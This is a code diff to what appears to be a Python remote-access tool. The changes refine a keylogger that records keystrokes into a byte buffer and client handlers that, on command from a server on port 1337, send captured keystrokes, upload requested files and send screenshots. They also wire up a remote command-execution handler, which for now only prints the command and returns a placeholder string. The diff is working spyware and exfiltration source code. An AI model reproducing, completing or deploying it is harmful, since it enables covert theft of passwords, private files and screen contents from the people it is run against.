@@ -15,7 +15,7 @@ HOST_PORT = 1337
 
 class Keylogger:
     def __init__(self):
-        self._buffer = ""
+        self._buffer = io.BytesIO()
         self._ctrl_state = False
         self._alt_state = False
         self._key_map = {"enter": "\n", "space": " ", "tab": "\t"}
@@ -29,7 +29,7 @@ class Keylogger:
 
         threading.Thread(target=_start_keylogger).start()
 
-    def get_keylogs(self) -> str:
+    def get_keylogs(self) -> io.BytesIO:
         return self._buffer
 
     # Key press events ---------------------------------------------------------------
@@ -57,7 +57,8 @@ class Keylogger:
             pressed = self._key_map.get(
                 key.name.split("_")[0], "[{0}]".format(key.name.split("_")[0])
             ).upper()
-        self._buffer += pressed if pressed else ""
+        if pressed:
+            self._buffer.write(pressed.encode("utf-8"))
 
     def _on_release(self, key) -> None:
         """Triggered on the event of a key being released
@@ -87,9 +88,12 @@ class Client:
 
     def _keylogs(self):
         """Called upon a keylogs instruction, sends any captured keylogs to the server"""
+        # fetch the keylogs from the keylogger object
         keylogs = self._keylogger.get_keylogs()
-        self._send(len(keylogs.encode("utf-8")))
-        self._send(keylogs)
+        # send the size of the keylogs in bytes to the server
+        self._send(keylogs.tell())
+        # send the keylogs to the server
+        self._send(keylogs.getvalue())
 
     def _download(self, file_path: str):
         """Called upon a download instruction, attempts to find the specified file and send it to the server
@@ -97,14 +101,18 @@ class Client:
         Args:
             file_path (str): Path to the file to be sent
         """
-        print(file_path)
-        print(os.path.isfile(file_path))
         file_size = 0
+        # check if the specified file exists...
         if os.path.isfile(file_path):
+            # get the size of the file
             file_size = os.path.getsize(file_path)
+        # send the size of the file to the server
         self._send(str(file_size))
+        # if the file exists...
         if file_size > 0:
+            # open the file
             with open(file_path, "rb") as file:
+                # send the file to the server
                 while True:
                     data = file.read(1024)
                     if not data:
@@ -113,14 +121,19 @@ class Client:
 
     def _screenshot(self):
         """Called upon a screenshot instruction, captures an image of screen and sends to server"""
+        # instantiate an empty bytes object
         img = io.BytesIO()
+        # capture an image of the screen and store the data in the bytes object
         ImageGrab.grab().save(img, format="PNG")
+        # send the size of the image in bytes to the server
         self._send(str(img.tell()))
+        # send the image to the server
         self._send(img.getvalue())
 
-    def _execute(self, cmd: str):
+    def _execute(self, cmd: list):
         """Called upon an execute instruction, executes the specified command on the client and sends any response to the server"""
-        ...
+        print(cmd)
+        self._send("DONNER KEBAB")
 
     def _handle_data(self, data: dict):
         cmd = data.get("cmd")
@@ -131,13 +144,21 @@ class Client:
         elif cmd == "keylogs":
             self._keylogs()
         elif cmd == "execute":
-            ...
+            self._execute(data.get("args"))
 
     # Server connection and communication -----------------------------------------------------
 
     def _send(self, data: any) -> None:
+        """Called when data needs to be sent to the server
+
+        Args:
+            data (any): data to be sent to the server
+        """
         self._sock.sendall(
-            str(data).encode("utf-8") if not isinstance(data, bytes) else data
+            # if the data is not bytes, convert it to bytes and send, otherwise send the data as is
+            str(data).encode("utf-8")
+            if not isinstance(data, bytes)
+            else data
         )
 
     def _connect(self):
